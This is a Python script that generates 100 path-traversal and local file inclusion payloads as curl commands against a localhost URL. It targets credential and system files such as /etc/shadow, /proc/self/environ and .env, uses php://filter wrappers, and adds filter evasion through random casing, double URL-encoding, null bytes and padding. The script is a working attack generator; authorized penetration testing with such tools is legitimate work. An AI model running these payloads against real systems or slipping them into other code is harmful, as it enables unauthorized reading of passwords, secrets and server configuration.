import random
import urllib.parse

TARGET = "http://localhost/test?"

PARAMS = [
    "file", "page", "include", "template",
    "doc", "view", "path", "resource"
]

SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "C:/Windows/system32/drivers/etc/hosts",
    "C:/Windows/win.ini",
    "C:/boot.ini",
    ".env",
    "config.php",
    "settings.ini"
]

TRAVERSAL_PATTERNS = [
    "../",
    "..\\",
    "../../",
    "..\\..\\",
]

WRAPPERS = [
    "php://filter/resource=index.php",
    "php://filter/convert.base64-encode/resource=index.php"
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def maybe_encode(s):
    if random.random() > 0.5:
        s = urllib.parse.quote(s)
    if random.random() > 0.7:
        s = urllib.parse.quote(s)
    return s

def maybe_null_byte(s):
    if random.random() > 0.7:
        s += "%00"
    return s

def maybe_noise_wrap(s):
    wrappers = [
        lambda x: x,
        lambda x: "abc" + x,
        lambda x: x + "123",
        lambda x: "test" + x + "data"
    ]
    return random.choice(wrappers)(s)

def generate_payload():
    if random.random() > 0.6:
        payload = random.choice(WRAPPERS)
    else:
        file = random.choice(SENSITIVE_FILES)
        if random.random() > 0.5:
            traversal = random.choice(TRAVERSAL_PATTERNS)
            depth = random.randint(1, 3)
            payload = traversal * depth + file
        else:
            payload = file

    if random.random() > 0.5:
        payload = random_case(payload)

    payload = maybe_null_byte(payload)
    payload = maybe_noise_wrap(payload)
    payload = maybe_encode(payload)

    return payload

generated = set()

while len(generated) < 100:
    param = random.choice(PARAMS)
    payload = generate_payload()
    curl_cmd = f'curl "{TARGET}{param}={payload}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
